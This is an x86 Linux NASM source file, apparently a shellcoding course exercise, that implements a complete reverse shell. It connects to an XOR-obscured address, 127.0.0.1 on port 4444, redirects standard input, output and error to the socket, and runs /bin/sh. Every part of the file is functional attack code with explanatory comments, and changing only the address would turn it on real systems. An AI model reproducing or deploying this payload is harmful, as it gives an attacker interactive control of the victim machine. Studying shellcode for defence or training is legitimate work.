; Filename: Reverse-Shell-StaticParams.nasm
; Author  : Andrea Perfetti
; SLAE ID : SLAE - 1547

global _start

_start:
	; Zeroing the registers	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	;// Creating File Descriptor for the Socket	
	;int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	mov ax, 0x167		; #define __NR_socket 359
	mov bl, 0x2		; AF_INET = 2
	mov cl, 0x1		; SOCK_STREAM = 1
	int 0x80		; FD will be stored in eax
	mov edi, eax		; Copying socket_fd into edi
	xor eax, eax		; Cleaning eax


	;// Creating sockaddr_in structure for Remote Address
	;struct sockaddr_in server;
	mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)

	; Pushing 8 zero bytes as per struct specifications
	push eax	
	push eax
	
	;server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);	
	mov eax, 0xfeffff80	; XOR-ed Address
	xor eax, 0xFFFFFFFF		
	push eax
	xor eax, eax

	;server.sin_port = htons(REMOTE_PORT);
	push word 0x5c11	; DEC 4444 -> HEX 0x115c

	;server.sin_family = AF_INET;
	push word 0x02		; AF_INET = 2

	
	;/ Connecting to the Server
	;int ret = connect(socket_fd, (struct sockaddr *)&server, sizeof(server));
	mov ax, 0x16a		; #define __NR_connect 362
	mov ebx, edi		; ebx = socket_fd	
	mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
	sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
	int 0x80

	
	; Testing if connect() completed successfully	
	test eax, eax		; Testing if EAX is zero
	jnz _exit_error		; if eax!=0 exit with error
	

	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
	;dup2(socket_fd, 0); 
	;dup2(socket_fd, 1);
	;dup2(socket_fd, 2);

	xor ecx, ecx		; ecx = 0
	mov cl, 0x3		; will need to loop 3 times. 	
_dup_loop:
	xor eax, eax
	mov al, 0x3f		; #define __NR_dup2 63
	mov ebx, edi		; ebx = socket_fd
	dec cl			; decrease ecx to get actual FD
	int 0x80
	jnz _dup_loop		; loop until ecx becomes -1 (sign flag)


	;// Invoking EXECVE
	;execve("/bin/sh", NULL, NULL);
	xor eax, eax		; eax = 0

	push eax		; push eax (0x0 as null terminator)
	push 0x68732f2f
	push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
	mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')
	
	push eax		; push 0x0
	mov edx, esp		; edx = pointer to TOS (null)

	push ebx		; push ebx (pointer to string '/bin//sh')
	mov ecx, esp		; ecx = pointer to TOS

	mov al, 0x0b		; #define __NR_execve 11
	int 0x80


	;// exit
	;return 0;
	xor eax, eax		; eax = 0
	xor ebx, ebx		; ebx = 0
	inc eax			; eax = 1 (exit syscall)
	int 0x80


_exit_error:
	;return ret;
	mov ebx, eax		; copying error into ebx
	xor eax, eax		; eax = 0
	inc eax			; eax = 1 (exit syscall)
	int 0x80